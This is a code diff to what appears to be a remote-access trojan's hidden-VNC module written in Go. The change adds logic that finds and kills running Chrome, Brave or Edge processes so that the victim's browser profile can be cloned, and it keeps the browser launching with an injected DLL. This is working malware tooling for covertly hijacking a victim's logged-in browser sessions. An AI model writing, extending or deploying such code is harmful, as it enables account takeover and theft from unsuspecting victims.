@@ -120,7 +120,7 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, searchPath, repl
 // If clone is true, it clones the real profile so file I/O is redirected to the clone.
 // If clone is false, it starts the browser with injection but no path redirection.
 // browser should be one of: "chrome", "brave", "edge".
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, onProgress CloneProgressFunc) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc) error {
 	info, ok := browserInfoMap[strings.ToLower(browser)]
 	if !ok {
 		return fmt.Errorf("unknown browser %q", browser)
@@ -130,6 +130,18 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 		exePath = findBrowserExe(info)
 		if exePath == "" {
 			return fmt.Errorf("%s not found", info.name)
+		}
+	}
+
+	if killIfRunning && clone {
+		processName := info.exeName
+		if processName == "" {
+			processName = filepath.Base(exePath)
+		}
+		if isProcessRunning(processName) {
+			log.Printf("hvnc %s: killing running %s before cloning", info.name, processName)
+			killProcess(processName)
+			time.Sleep(1500 * time.Millisecond)
 		}
 	}
 
@@ -155,11 +167,12 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 // StartHVNCChromeInjected is kept for backward compatibility.
 func StartHVNCChromeInjected(chromePath string, dllBytes []byte) error {
-	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, true, false, nil)
+	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, true, false, true, nil)
 }
 
 type browserInfo struct {
 	name       string
+	exeName    string
 	exePaths   []string // candidate exe locations (env vars expanded at runtime)
 	userData   string   // relative to LOCALAPPDATA (or APPDATA for Firefox)
 	useAppData bool     // true = use APPDATA instead of LOCALAPPDATA
@@ -167,21 +180,24 @@ type browserInfo struct {
 
 var browserInfoMap = map[string]browserInfo{
 	"chrome": {
-		name: "Chrome",
+		name:    "Chrome",
+		exeName: "chrome.exe",
 		exePaths: []string{
 			`\Google\Chrome\Application\chrome.exe`,
 		},
 		userData: `Google\Chrome\User Data`,
 	},
 	"brave": {
-		name: "Brave",
+		name:    "Brave",
+		exeName: "brave.exe",
 		exePaths: []string{
 			`\BraveSoftware\Brave-Browser\Application\brave.exe`,
 		},
 		userData: `BraveSoftware\Brave-Browser\User Data`,
 	},
 	"edge": {
-		name: "Edge",
+		name:    "Edge",
+		exeName: "msedge.exe",
 		exePaths: []string{
 			`\Microsoft\Edge\Application\msedge.exe`,
 		},
@@ -207,6 +223,92 @@ func findBrowserExe(info browserInfo) string {
 		}
 	}
 	return ""
+}
+
+func isProcessRunning(name string) bool {
+	snapshot, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(0x2, 0)
+	if snapshot == uintptr(^uintptr(0)) {
+		return false
+	}
+	defer procCloseHandle.Call(snapshot)
+
+	type processEntry32 struct {
+		Size            uint32
+		CntUsage        uint32
+		ProcessID       uint32
+		DefaultHeapID   uintptr
+		ModuleID        uint32
+		CntThreads      uint32
+		ParentProcessID uint32
+		PriClassBase    int32
+		Flags           uint32
+		ExeFile         [260]uint16
+	}
+
+	var entry processEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+	ret, _, _ := kernel32.NewProc("Process32FirstW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
+	if ret == 0 {
+		return false
+	}
+	target := strings.ToLower(name)
+	for {
+		exeName := syscall.UTF16ToString(entry.ExeFile[:])
+		if strings.ToLower(exeName) == target {
+			return true
+		}
+		entry.Size = uint32(unsafe.Sizeof(entry))
+		ret, _, _ = kernel32.NewProc("Process32NextW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
+		if ret == 0 {
+			break
+		}
+	}
+	return false
+}
+
+func killProcess(name string) {
+	snapshot, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(0x2, 0)
+	if snapshot == uintptr(^uintptr(0)) {
+		return
+	}
+	defer procCloseHandle.Call(snapshot)
+
+	type processEntry32 struct {
+		Size            uint32
+		CntUsage        uint32
+		ProcessID       uint32
+		DefaultHeapID   uintptr
+		ModuleID        uint32
+		CntThreads      uint32
+		ParentProcessID uint32
+		PriClassBase    int32
+		Flags           uint32
+		ExeFile         [260]uint16
+	}
+
+	var entry processEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+	ret, _, _ := kernel32.NewProc("Process32FirstW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
+	if ret == 0 {
+		return
+	}
+	target := strings.ToLower(name)
+	for {
+		exeName := syscall.UTF16ToString(entry.ExeFile[:])
+		if strings.ToLower(exeName) == target {
+			hProc, _, _ := procOpenProcess.Call(0x0001, 0, uintptr(entry.ProcessID)) // PROCESS_TERMINATE
+			if hProc != 0 {
+				kernel32.NewProc("TerminateProcess").Call(hProc, 0)
+				procCloseHandle.Call(hProc)
+				log.Printf("hvnc: terminated %s (PID %d)", name, entry.ProcessID)
+			}
+		}
+		entry.Size = uint32(unsafe.Sizeof(entry))
+		ret, _, _ = kernel32.NewProc("Process32NextW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
+		if ret == 0 {
+			break
+		}
+	}
 }
 
 func getBrowserUserDataDir(info browserInfo) string {
